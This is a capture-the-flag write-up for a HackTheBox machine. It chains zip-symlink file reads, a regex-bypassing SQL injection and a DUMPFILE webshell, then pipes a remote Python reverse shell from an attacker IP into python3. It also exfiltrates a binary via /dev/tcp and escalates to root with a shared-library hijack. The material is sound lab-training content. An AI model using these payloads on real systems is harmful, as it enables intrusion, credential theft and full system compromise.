---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Zipping

## Enumeration

```
└─$ nmap 10.10.11.229 -sV -p22,80 -sC
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 10:21 EST
Nmap scan report for 10.10.11.229
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.21 seconds
```

## 80 HTTP

### gobuster

```
/uploads              (Status: 301) [Size: 312] [--> http://zipping.htb/uploads/]
/shop                 (Status: 301) [Size: 309] [--> http://zipping.htb/shop/]
/assets               (Status: 301) [Size: 311] [--> http://zipping.htb/assets/]
/server-status        (Status: 403) [Size: 276]
```

### virtual hosts

none

### LFI

```
http://10.10.11.229/shop/index.php?page=../index
http://10.10.11.229/shop/index.php?page=/var/www/html/index
```

We further enumerated what interesting pages we can include.

```
388	**functions**	500	false	false	295	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	
1354	index	500	false	false	295	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	
1944	functions	500	false	false	295	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	
3069	index	500	false	false	295	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	
2364	product	200	false	false	327	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	
1404	product	200	false	false	328	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	
```

### Symlink Inclusion

The webpage accepts a zip with one pdf file. The zip gets extracted and the PDF is then put on a temporary location on the web server. So, there is a possibility to create a zip with simlink. When accessed by the webserver, the symlink target is served instead.

To create the symlink:

1. Create the symlink `ln -s /var/www/html/shop/index.php a.pdf`
2. Zip the symlink `zip --symlinks a.zip a.pdf`
3. Upload `a.zip`
4. Access the `a.pdf`

### Interesting Files

The symlinks gave us some interesing files. **shop/functions.php**:

```
<?php
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
    try {
        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
        // If there is an error with the connection, stop the script and display the error.
        exit('Failed to connect to database!');
    }
}
// Template header, feel free to customize this
function template_header($title) {
$num_items_in_cart = isset($_SESSION['cart']) ? count($_SESSION['cart']) : 0;
echo <<<EOT
<!DOCTYPE html>
<html>
        <head>
                <meta charset="utf-8">
                <title>$title</title>
                <link href="assets/style.css" rel="stylesheet" type="text/css">
                <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
        </head>
        <body>
        <header>
            <div class="content-wrapper">
                <a href=".." style="text-decoration: none;"><h1>Zipping Watch Store</h1></a>
                <nav>
                    <a href="index.php">Home</a>
                    <a href="index.php?page=products">Products</a>
                </nav>
                <div class="link-icons">
                    <a href="index.php?page=cart">
                                                <i class="fas fa-shopping-cart"></i>
                                                <span>$num_items_in_cart</span>
                                        </a>
                </div>
            </div>
        </header>
        <main>
EOT;
}
// Template footer
function template_footer() {
$year = date('Y');
echo <<<EOT
        </main>
        <footer>
            <div class="content-wrapper">
                <p>&copy; $year, Zipping Watch Store</p>
            </div>
        </footer>
    </body>
</html>
EOT;
}
?>
```

**/etc/passwd**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

**uploads.php**

```
<html>
<html lang="en">
<head>
        <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Start your development with Creative Design landing page.">
    <meta name="author" content="Devcrud">
    <title>Zipping | Watch store</title>

    <!-- font icons -->
    <link rel="stylesheet" href="assets/vendors/themify-icons/css/themify-icons.css">

    <!-- Bootstrap + Creative Design main styles -->
        <link rel="stylesheet" href="assets/css/creative-design.css">

</head>
<body data-spy="scroll" data-target=".navbar" data-offset="40" id="home">
    <!-- Page Header -->
    <header class="header header-mini"> 
      <div class="header-title">Work with Us</div> 
      <nav aria-label="breadcrumb">
         <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="index.php">Home</a></li>
            <li class="breadcrumb-item active" aria-current="page">Work with Us</li>
         </ol>
      </nav>
    </header> <!-- End Of Page Header -->

    <section id="work" class="text-center">
        <!-- container -->
        <div class="container">
            <h1>WORK WITH US</h1>
            <p class="mb-5">If you are interested in working with us, do not hesitate to send us your curriculum.\n The application will only accept zip files, inside them there must be a pdf file containing your curriculum.</p>

            <?php
            if(isset($_POST['submit'])) {
              // Get the uploaded zip file
              $zipFile = $_FILES['zipFile']['tmp_name'];
              if ($_FILES["zipFile"]["size"] > 300000) {
                echo "<p>File size must be less than 300,000 bytes.</p>";
              } else {
                // Create an md5 hash of the zip file
                $fileHash = md5_file($zipFile);
                // Create a new directory for the extracted files
                $uploadDir = "uploads/$fileHash/";
		$tmpDir = sys_get_temp_dir();
                // Extract the files from the zip
                $zip = new ZipArchive;
                if ($zip->open($zipFile) === true) {
                  if ($zip->count() > 1) {
                  echo '<p>Please include a single PDF file in the archive.<p>';
                  } else {
                  // Get the name of the compressed file
                  $fileName = $zip->getNameIndex(0);
                  if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
                    $uploadPath = $tmpDir.'/'.$uploadDir;
                    echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '>/dev/null');
                    if (file_exists($uploadPath.$fileName)) {
                      mkdir($uploadDir);
                      rename($uploadPath.$fileName, $uploadDir.$fileName);
                    }
                    echo '<p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a href="'.$uploadDir.$fileName.'">'.$uploadDir.$fileName.'</a>'.'</p>';
                  } else {
                    echo "<p>The unzipped file must have  a .pdf extension.</p>";
                  }
                 }
                } else {
                  echo "Error uploading file.";
                }

              }
            }
            ?>

            <!-- Submit File -->
            <form id="zip-form" enctype="multipart/form-data" method="post" action="upload.php">
              <div class="mb-3">
                <input type="file" class="form-control" name="zipFile" accept=".zip">
              </div>
              <button type="submit" class="btn btn-primary" name="submit">Upload</button>
            </form><!-- End submit file -->

        </div><!-- End of Container-->      
    </section><!-- End of Contact Section -->
    <!-- Section -->
    <section class="pb-0">
        <!-- Container -->
        <div class="container">
            <!-- Pre footer -->
            <div class="pre-footer">
                <ul class="list">
                    <li class="list-head">
                        <h6 class="font-weight-bold">ABOUT US</h6>
                    </li>
                    <li class="list-body">
                      <p>Zipping Co. is a company that is dedicated to producing high-quality watches that are both stylish and functional. We are constantly pushing the boundaries of what is possible with watch design and are known for their commitment to innovation and customer service.</p>  
                      <a href="#"><strong class="text-primary">Zipping</strong> <span class="text-dark">Watch Store</span></a>
                    </li>
                </ul>
                <ul class="list">
                    <li class="list-head">
                        <h6 class="font-weight-bold">USEFUL LINKS</h6>
                    </li>
                    <li class="list-body">
                        <div class="row">
                            <div class="col">
                                <a href="#">Link 1</a>
                                <a href="#">Link 2</a>
                                <a href="#">Link 3</a>
                                <a href="#">Link 4</a>
                            </div>
                            <div class="col">
                                <a href="#">Link 5</a>
                                <a href="#">Link 6</a>
                                <a href="#">Link 7</a>
                                <a href="#">Link 8</a>
                            </div>
                        </div>
                    </li>
                </ul>
                <ul class="list">
                    <li class="list-head">
                        <h6 class="font-weight-bold">CONTACT INFO</h6>
                    </li>
                    <li class="list-body">
                        <p>Contact us and we'll get back to you within 24 hours.</p>
                        <p><i class="ti-location-pin"></i> 12345 Fake ST NoWhere AB Country</p>
                        <p><i class="ti-email"></i>  info@website.com</p>
                        <div class="social-links">
                            <a href="javascript:void(0)" class="link"><i class="ti-facebook"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-twitter-alt"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-google"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-pinterest-alt"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-instagram"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-rss"></i></a>
                        </div>
                    </li>
                </ul> 
            </div><!-- End of Pre footer -->            

            <!-- foooter -->
            <footer class="footer">
                <p>Made by <a href="https://github.com/xdann1">xDaNN1</p>
            </footer><!-- End of Footer-->  
            
        </div><!--End of Container -->      
    </section><!-- End of Section -->

</body>
</html>
```

**shop/index.php**

```
<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>
```

**shop/products.php**

```
<?php
// The amounts of products to show on each page
$num_products_on_each_page = 4;
// The current page - in the URL, will appear as index.php?page=products&p=1, index.php?page=products&p=2, etc...
$current_page = isset($_GET['p']) && is_numeric($_GET['p']) ? (int)$_GET['p'] : 1;
// Select products ordered by the date added
$stmt = $pdo->prepare('SELECT * FROM products ORDER BY date_added DESC LIMIT ?,?');
// bindValue will allow us to use an integer in the SQL statement, which we need to use for the LIMIT clause
$stmt->bindValue(1, ($current_page - 1) * $num_products_on_each_page, PDO::PARAM_INT);
$stmt->bindValue(2, $num_products_on_each_page, PDO::PARAM_INT);
$stmt->execute();
// Fetch the products from the database and return the result as an Array
$products = $stmt->fetchAll(PDO::FETCH_ASSOC);
// Get the total number of products
$total_products = $pdo->query('SELECT * FROM products')->rowCount();
?>

<?=template_header('Zipping | Products')?>

<div class="products content-wrapper">
    <h1>Products</h1>
    <p><?=$total_products?> Products</p>
    <div class="products-wrapper">
        <?php foreach ($products as $product): ?>
        <a href="index.php?page=product&id=<?=$product['id']?>" class="product">
            " width="200" height="200" alt="<?=$product['name']?>">
            <span class="name"><?=$product['name']?></span>
            <span class="price">
                &dollar;<?=$product['price']?>
                <?php if ($product['rrp'] > 0): ?>
                <span class="rrp">&dollar;<?=$product['rrp']?></span>
                <?php endif; ?>
            </span>
        </a>
        <?php endforeach; ?>
    </div>
    <div class="buttons">
        <?php if ($current_page > 1): ?>
        <a href="index.php?page=products&p=<?=$current_page-1?>">Prev</a>
        <?php endif; ?>
        <?php if ($total_products > ($current_page * $num_products_on_each_page) - $num_products_on_each_page + count($products)): ?>
        <a href="index.php?page=products&p=<?=$current_page+1?>">Next</a>
        <?php endif; ?>
    </div>
</div>

<?=template_footer()?>
```

**product.php**

```
<?php
// Check to make sure the id parameter is specified in the URL
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
        header('Location: index.php');
    } else {
        // Prepare statement and execute, but does not prevent SQL injection
        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
        $stmt->execute();
        // Fetch the product from the database and return the result as an Array
        $product = $stmt->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if (!$product) {
            // Simple error to display if the id for the product doesn't exists (array is empty)
            exit('Product does not exist!');
        }
    }
} else {
    // Simple error to display if the id wasn't specified
    exit('No ID provided!');
}
?>

<?=template_header('Zipping | Product')?>

<div class="product content-wrapper">
    " width="500" height="500" alt="<?=$product['name']?>">
    <div>
        <h1 class="name"><?=$product['name']?></h1>
        <span class="price">
            &dollar;<?=$product['price']?>
            <?php if ($product['rrp'] > 0): ?>
            <span class="rrp">&dollar;<?=$product['rrp']?></span>
            <?php endif; ?>
        </span>
        <form action="index.php?page=cart" method="post">
            <input type="number" name="quantity" value="1" min="1" max="<?=$product['quantity']?>" placeholder="Quantity" required>
            <input type="hidden" name="product_id" value="<?=$product['id']?>">
            <input type="submit" value="Add To Cart">
        </form>
        <div class="description">
            <?=$product['desc']?>
        </div>
    </div>
</div>

<?=template_footer()?>
```

### SQL injection

In **product.php**, there is SQL injection vulnerability.

```
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
$stmt->execute();
```

The problem is that the ID have some filtering:

```
// Filtering user input for letters or special characters
  if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
      header('Location: index.php');
  } else {
```

According to the regex, it checks only the first line `^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]` and then it needs to end with a number `[^0-9]$/`. So, we can try to bypass it with `%0a` character.

Let's try it.

```
└─$ curl "http://10.10.11.229/shop/index.php?page=product&id=123%0a0'--%20helloworld231" -v
*   Trying 10.10.11.229:80...
* Connected to 10.10.11.229 (10.10.11.229) port 80 (#0)
> GET /shop/index.php?page=product&id=123%0a0'--%20helloworld231 HTTP/1.1
> Host: 10.10.11.229
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Fri, 10 Nov 2023 17:25:24 GMT
< Server: Apache/2.4.54 (Ubuntu)
< Set-Cookie: PHPSESSID=m5p763bkttcg3hhv291q45t5ru; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Content-Length: 23
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 10.10.11.229 left intact
Product does not exist!   
```

Returns 200, so it seems like execured query.

```
└─$ curl "http://10.10.11.229/shop/index.php?page=product&id=123%0a0'%20helloworld231" -v 
*   Trying 10.10.11.229:80...
* Connected to 10.10.11.229 (10.10.11.229) port 80 (#0)
> GET /shop/index.php?page=product&id=123%0a0'%20helloworld231 HTTP/1.1
> Host: 10.10.11.229
> User-Agent: curl/7.88.1
> Accept: */*
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 500 Internal Server Error
< Date: Fri, 10 Nov 2023 17:26:48 GMT
< Server: Apache/2.4.54 (Ubuntu)
< Set-Cookie: PHPSESSID=7l2bsdg5t7b9b5cvpqh5mnu5k4; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Content-Length: 0
< Connection: close
< Content-Type: text/html; charset=UTF-8
< 
* Closing connection 0
```

The server responds with error 500 because there is no `--` here. So it seems like it is really working.

#### SQL table schema

`http://10.10.11.229/shop/index.php?page=product&id=123%0a0%27%20UNION%20SELECT%20table_name,null,null,null,null,null,null,null%20FROM%20information_schema.tables--%20helloworld231`

#### SQLMAP assisted injection

Now, we can make our life easier and use SQLMAP to do the injection for us. However, we need to specify the injection point, using `*`.

```
sqlmap -u "http://zipping.htb/shop/index.php?page=product&id=11111%0a*+--%20helloworld231"
```

#### Dumping file

We can use MySQL to write a file on a disc using `SELECT ... INTO DUMPFILE`. See: https://dev.mysql.com/doc/refman/8.0/en/select-into.html Then we can use LFI to execute a PHP webshell

First we need to locate where we can create the file

Attempts that did not work (returns 500, or cannot be executed).

* `/tmp`

  ```
  http://10.10.11.229/shop/index.php?page=product&id=123%0a0%27%20UNION%20SELECT%20'dumpzom',null,null,null,null,null,null,null%20FROM%20products+into+dumpfile+'/tmp/dumpzom.txt'--%20helloworld231
  ```
* `/var/www/html/uploads`

  ```
  http://10.10.11.229/shop/index.php?page=product&id=123%0a0%27%20UNION%20SELECT%20'dumpzom',null,null,null,null,null,null,null%20FROM%20products+into+dumpfile+'/var/www/html/uploads/dumpzom.txt'--%20helloworld231
  ```
* `/usr/lib/mysql/plugin/`

  ```
  http://10.10.11.229/shop/index.php?page=product&id=123%0a0%27%20UNION%20SELECT%20'dumpzom',null,null,null,null,null,null,null%20FROM%20products+into+dumpfile+'/usr/lib/mysql/plugin/lib_mysqlu.so'--%20helloworld231
  ```

What did work is `/dev/shm` which is a shared memory. Everyone can write and read there!

```
http://10.10.11.229/shop/index.php?page=product&id=123%0a0%27%20UNION%20SELECT%20'dumpzom',null,null,null,null,null,null,null%20FROM%20products+into+dumpfile+'/dev/shm/dumpzom.php'--%20helloworld231
```

Now it can be included as LFI:

```
http://10.10.11.229/shop/index.php?page=/dev/shm/dumpzom
```

However, we still need to get around checks on special chars in the payload.

##### NOTE: When requests get stuck (server not responding, hanging)

Are you using browser or Burp? Because, PHP session uses database locking based on session (the PHPSESSID cookie). Curl does not hang, because it does not remember cookies. If you want to use Burp Repeater, simply remove the whole line, it's not needed:

```
Cookie: PHPSESSID=... 
```

#### Final payload: Getting the user

1. Open HTTP server to serve the reverse shell

```
python -m http.server 8000
```

2. Send SQL injection payload. The special chars are circumvented by only having the PHP to pull and execute the shell from remote location (your HTTP server). Not the reverse shell code itself.

```
curl "http://10.10.11.229/shop/index.php?page=product&id=123%0a0%27%20UNION%20SELECT%20'<?php%20exec(\"curl%2010.10.14.230:8000/shell.py|python3\")%20;?>',null,null,null,null,null,null,null%20FROM%20products+into+dumpfile+'/dev/shm/getshell.php'--%20231" -v
```

3. Start shell handler

```
python2 handler.py -b 10.10.14.230:8888
```

5. Execute the injected PHP to download and execute your shell.

```
curl http://10.10.11.229/shop/index.php?page=/dev/shm/getshell
```

The `shell.py` is the nice TTY python shell. https://github.com/infodox/python-pty-shells

And that is enought for the USER FLAG.

## Road to ROOT

By quick checking (`sudo -l`). We see interesing binary `/usr/bin/stock` which can be executed as root.

So, let's exfiltrate it and see what is there.

### File Exfiltration (without nc)

```
# In Attacker
nc -lvnp 7777 > stock
# In Victim
cat /usr/bin/stock > /dev/tcp/10.10.14.230/7777
```

### /usr/bin/stock

The file needs some password. Let's see if we can go around it. Luckily, it is not obfuscated, so we can get it using simple `strings` command.

```
strings /usr/bin/stock
```

That gives us the password: `St0ckM4nager`

The binary can display or edit some files, nothing really remarkable there. So, we need to dive deeper.

#### Strace

Let's use `strace` to look under the hood.

```
strace sudo usr/bin/stock
```

And that gives us an interesing information.

```
write(1, "Enter the password: ", 20Enter the password: )    = 20
read(0, St0ckM4nager
"St0ckM4nager\n", 1024)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

It attempts to dynamicaly load a library.

NOTE: It can be also seen in ghidra. The call obfuscated by XOR (a red flag right there). And by inspecting the list of imported functions, there is `dlopen`, which hints dynamic loading.

This can be exploited by swaping the libraries. See: https://blog.cyberethical.me/thm-linuxprivesc-sudo

We prepare the following C program `libcounter.c`

```
/*
Example of the program that opens the shell under root user.
Source: https://tryhackme.com/room/linuxprivesc
*/

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    // clear current LD_PRELOAD value
    unsetenv("LD_PRELOAD");

    // set real, effective, and saved user or group ID
    setresuid(0,0,0);

    // run shell with SUID persistence
    // otherwise it would run under current user
    system("/bin/bash -p");
}
```

And compile it. `gcc -fPIC -shared -nostartfiles -o libcounter.so libcounter.c`

Then we place the binary to the location revealed by `strace`.

```
/home/rektsu/.config/libcounter.so
```

Now, just execute the binary with sudo and get the root shell.

```
sudo usr/bin/stock
```